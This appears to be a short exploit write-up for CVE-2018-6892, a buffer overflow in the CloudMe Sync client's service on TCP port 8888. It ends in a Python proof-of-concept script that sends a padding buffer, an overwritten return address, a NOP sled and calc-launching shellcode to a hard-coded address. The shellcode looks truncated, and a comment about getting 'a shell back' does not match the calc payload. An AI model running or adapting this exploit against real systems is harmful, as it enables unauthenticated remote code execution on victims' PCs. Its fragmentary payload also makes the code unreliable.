Product:
===========
CloudMe Sync <= v1.10.9

CloudMe is a file storage service operated by CloudMe AB that offers cloud storage, file synchronization and client software.
It features a blue folder that appears on all devices with the same content, all files are synchronized between devices.


Vulnerability Type:
===================
`Buffer Overflow`


CVE Reference:
==============
`CVE-2018-6892`

Security Issue:
================
Unauthenticated remote attackers that can connect to the "CloudMe Sync" client application listening on port 8888, can send a malicious payload causing
a Buffer Overflow condition. This will result in an attacker controlling the programs execution flow and allowing arbitrary code execution on the victims PC.

CloudMe Sync client creates a socket listening on TCP Port 8888 (0x22B8)

In Qt5Core:

![q5_network](/static/img/02/q5_network.png)

lets try to send some junk data to our service listening at `8888` 

![crash](/static/img/02/crash.png)

this software is very easy as ASLR / SafeSEH are all set to false making the exploit reliable, and universal exploit.
as we can also see the crash overwritte `eip , edi , ebx` in this case . we can see we have two attack vectors via `SEH or Stack Based Overflow` 

```python 
#!/usr/bin/python
# tested on windows 7 x86 sp1 enterprise
import socket
import struct

# pop calc.exe

shellcode =  "\x31\xF6\x56\x64\x8B\x76\x30\x8B\x76\x0C\x8B\x76\x1C\x8B"
shellcode += "\x6E\x08\x8B\x36\x8B\x5D\x3C\x8B\x5C\x1D\x78\x01\xEB\x8B"

payload = "A" * 1036 + '\x25\xDF\xB8\x68' + "\x90" * 16 + shellcode

try:
    print "\nSending tons of random bytes..."
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('192.168.0.27', 8888)) 
    client.send(payload) 
    client.close() 
    print "\nDone! Wonder if we got that shell back?"
except:
    print "Could not connect to 8888 for some reason..."
```
